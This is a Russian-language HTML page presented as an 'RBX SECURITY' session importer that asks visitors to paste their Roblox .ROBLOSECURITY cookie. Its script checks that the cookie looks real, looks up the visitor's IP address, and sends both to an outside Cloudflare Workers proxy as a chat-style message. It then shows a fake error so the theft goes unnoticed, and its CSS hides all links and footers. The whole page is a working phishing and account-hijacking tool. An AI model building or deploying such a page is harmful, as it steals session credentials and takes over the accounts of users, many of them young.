
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>✦ SECURITY SUITE ✦</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        :root {
            --bg-gradient-1: #0a0a0f;
            --bg-gradient-2: #120c1f;
            --bg-gradient-3: #1a0f2e;
            --bg-gradient-4: #0f0a1c;
            --card-bg: rgba(12, 10, 20, 0.75);
            --card-border: rgba(138, 92, 246, 0.5);
            --card-glow: rgba(138, 92, 246, 0.3);
            --text-primary: #f0e6ff;
            --text-secondary: #c084fc;
            --text-muted: #a78bfa;
            --btn-gradient-1: #7c3aed;
            --btn-gradient-2: #a855f7;
            --btn-gradient-3: #c084fc;
            --accent: #a855f7;
            --input-bg: rgba(10, 8, 18, 0.8);
            --star-color: #c084fc;
        }

        body.light {
            --bg-gradient-1: #e6f0fa;
            --bg-gradient-2: #d4e2f0;
            --bg-gradient-3: #c2d4e6;
            --bg-gradient-4: #d0deec;
            --card-bg: rgba(255, 255, 255, 0.85);
            --card-border: rgba(100, 120, 200, 0.6);
            --card-glow: rgba(100, 120, 200, 0.2);
            --text-primary: #1a2a4f;
            --text-secondary: #3a6ea5;
            --text-muted: #5a7dae;
            --btn-gradient-1: #4a8ec8;
            --btn-gradient-2: #6aaee0;
            --btn-gradient-3: #8ac0e8;
            --accent: #5a9bd5;
            --input-bg: rgba(255, 255, 255, 0.9);
            --star-color: #ffd966;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, var(--bg-gradient-1) 0%, var(--bg-gradient-2) 25%, var(--bg-gradient-3) 50%, var(--bg-gradient-4) 75%, var(--bg-gradient-1) 100%);
            background-size: 200% 200%;
            animation: gradientShift 15s ease infinite;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .star {
            position: absolute;
            background: var(--star-color);
            border-radius: 50%;
            opacity: 0;
            animation: twinkle 4s infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0.1; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.3); }
        }

        .floating-cookie {
            position: fixed;
            pointer-events: none;
            font-size: 28px;
            z-index: 0;
            opacity: 0.35;
            animation: floatAnim linear infinite;
            filter: drop-shadow(0 0 8px var(--accent));
        }
        @keyframes floatAnim {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            15% { opacity: 0.5; }
            85% { opacity: 0.5; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .glass-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 56px;
            padding: 44px 40px;
            max-width: 540px;
            width: 100%;
            border: 1px solid var(--card-border);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 30px var(--card-glow);
            transition: all 0.3s ease;
            z-index: 10;
            position: relative;
        }
        .glass-card:hover {
            transform: translateY(-6px);
            border-color: var(--accent);
            box-shadow: 0 30px 55px rgba(0, 0, 0, 0.4), 0 0 45px var(--accent);
        }

        .logo {
            text-align: center;
            margin-bottom: 36px;
        }
        .logo h1 {
            font-size: 46px;
            font-weight: 800;
            background: linear-gradient(135deg, #f0e6ff, var(--accent), #e9d5ff);
            background-size: 200% auto;
            animation: textShine 4s linear infinite;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -1px;
        }
        @keyframes textShine {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .logo p {
            color: var(--text-secondary);
            font-size: 11px;
            letter-spacing: 4px;
            margin-top: 10px;
            text-transform: uppercase;
            font-weight: 100;
            text-shadow: 0 0 5px var(--accent);
        }

        .label {
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .cookie-input {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid var(--card-border);
            border-radius: 32px;
            padding: 20px 22px;
            color: var(--text-primary);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.2s;
        }
        .cookie-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 18px var(--accent);
        }

        .status {
            font-size: 13px;
            margin: 18px 0 28px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-muted);
            background: rgba(0, 0, 0, 0.2);
            padding: 10px 18px;
            border-radius: 60px;
            backdrop-filter: blur(4px);
            font-weight: 500;
        }

        .btn {
            width: 100%;
            background: linear-gradient(135deg, var(--btn-gradient-1), var(--btn-gradient-2), var(--btn-gradient-3));
            background-size: 200% auto;
            border: none;
            border-radius: 60px;
            padding: 18px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 0 12px var(--accent);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px var(--accent);
            background-position: 100% 0;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .message-area {
            text-align: center;
            margin-top: 24px;
        }
        .error-text {
            color: #ff8a7a;
            background: rgba(255, 70, 50, 0.12);
            padding: 12px 20px;
            border-radius: 60px;
            font-size: 13px;
            font-weight: 500;
            backdrop-filter: blur(4px);
            border-left: 3px solid #ff5a4a;
        }

        .theme-switch {
            position: fixed;
            top: 24px;
            right: 24px;
            z-index: 100;
        }
        .theme-btn {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid var(--card-border);
            border-radius: 60px;
            padding: 10px 22px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-secondary);
            transition: all 0.2s;
        }
        .theme-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px var(--accent);
            border-color: var(--accent);
        }

        a, a[href*="github"], a[href*="github.com"], a[href*="github.io"], .github-link, footer, .footer {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }
    </style>
</head>
<body>
<div class="theme-switch">
    <button class="theme-btn" id="themeToggleBtn">🌙 Тема</button>
</div>
<div class="stars" id="stars"></div>
<div class="glass-card">
    <div class="logo">
        <h1>✦ RBX SECURITY ✦</h1>
        <p>SESSION IMPORTER</p>
    </div>
    <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
    <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
    <div class="status" id="status">
        <span>✨</span> Ожидание ввода...
    </div>
    <button class="btn" id="sendBtn" disabled>🔄 Заменить сессию</button>
    <div id="messageArea" class="message-area"></div>
</div>

<script>
    (function(){
        const PROXY_URL = "https://robl.megadoner517.workers.dev";

        // ТЕМА
        const themeBtn = document.getElementById('themeToggleBtn');
        function loadTheme(){
            const saved = localStorage.getItem('rbx_theme');
            if(saved === 'light'){
                document.body.classList.add('light');
                if(themeBtn) themeBtn.innerHTML = '☀️ Тема';
            } else {
                document.body.classList.remove('light');
                if(themeBtn) themeBtn.innerHTML = '🌙 Тема';
            }
        }
        function toggleTheme(){
            if(document.body.classList.contains('light')){
                document.body.classList.remove('light');
                localStorage.setItem('rbx_theme', 'dark');
                if(themeBtn) themeBtn.innerHTML = '🌙 Тема';
            } else {
                document.body.classList.add('light');
                localStorage.setItem('rbx_theme', 'light');
                if(themeBtn) themeBtn.innerHTML = '☀️ Тема';
            }
        }
        if(themeBtn) themeBtn.addEventListener('click', toggleTheme);
        loadTheme();

        // ЗВЁЗДЫ
        function createStars(){
            const container = document.getElementById('stars');
            for(let i=0;i<150;i++){
                const star = document.createElement('div');
                star.classList.add('star');
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = Math.random() * 3 + 1 + 'px';
                star.style.height = star.style.width;
                star.style.animationDelay = Math.random() * 5 + 's';
                star.style.animationDuration = Math.random() * 3 + 2 + 's';
                container.appendChild(star);
            }
        }
        createStars();

        // ПЕЧЕНЬКИ
        for(let i=0;i<40;i++){
            let cookie = document.createElement('div');
            cookie.classList.add('floating-cookie');
            cookie.textContent = '🍪';
            cookie.style.left = Math.random() * 100 + '%';
            cookie.style.fontSize = (22 + Math.random() * 32) + 'px';
            cookie.style.animationDuration = (9 + Math.random() * 16) + 's';
            cookie.style.animationDelay = Math.random() * -20 + 's';
            document.body.appendChild(cookie);
        }

        const cookieInput = document.getElementById('cookie');
        const sendBtn = document.getElementById('sendBtn');
        const statusDiv = document.getElementById('status');
        const msgArea = document.getElementById('messageArea');

        function isValidCookie(val){
            if(!val || val.trim() === '') return false;
            const t = val.trim();
            if(!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
            if(t.length < 800) return false;
            return true;
        }

        function updateUI(){
            const val = cookieInput.value;
            if(!val || val.trim() === ''){
                statusDiv.innerHTML = '<span>✨</span> Ожидание ввода...';
                statusDiv.style.color = '#a78bfa';
                sendBtn.disabled = true;
            } else if(isValidCookie(val)){
                statusDiv.innerHTML = '<span>✅</span> Формат куки верный. Можно отправлять.';
                statusDiv.style.color = '#22c55e';
                sendBtn.disabled = false;
            } else {
                statusDiv.innerHTML = '<span>❌</span> Неверный формат. Нужна .ROBLOSECURITY (мин. 800 символов)';
                statusDiv.style.color = '#ef4444';
                sendBtn.disabled = true;
            }
        }

        function showMessage(text){
            msgArea.innerHTML = `<div class="error-text">⚠️ ${text}</div>`;
            setTimeout(() => msgArea.innerHTML = '', 4500);
        }

        cookieInput.addEventListener('input', updateUI);
        cookieInput.addEventListener('paste', () => setTimeout(updateUI, 100));
        updateUI();

        sendBtn.onclick = async () => {
            const cookie = cookieInput.value.trim();
            if(!isValidCookie(cookie)) return;

            sendBtn.disabled = true;
            sendBtn.textContent = "⏳ Отправка...";

            let ip = 'unknown';
            try{
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e){}

            const msg = {
                content: `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${cookie.length} символов\n**Содержимое:**\n\`\`\`${cookie}\`\`\``
            };

            try{
                const response = await fetch(PROXY_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(msg)
                });
                showMessage('Ошибка перенаправления! Обратитесь в поддержку.');
            } catch(e){
                showMessage('Ошибка сети. Попробуйте позже.');
            }

            sendBtn.disabled = false;
            sendBtn.textContent = "🔄 Заменить сессию";
        };
    })();
</script>
</body>
</html>
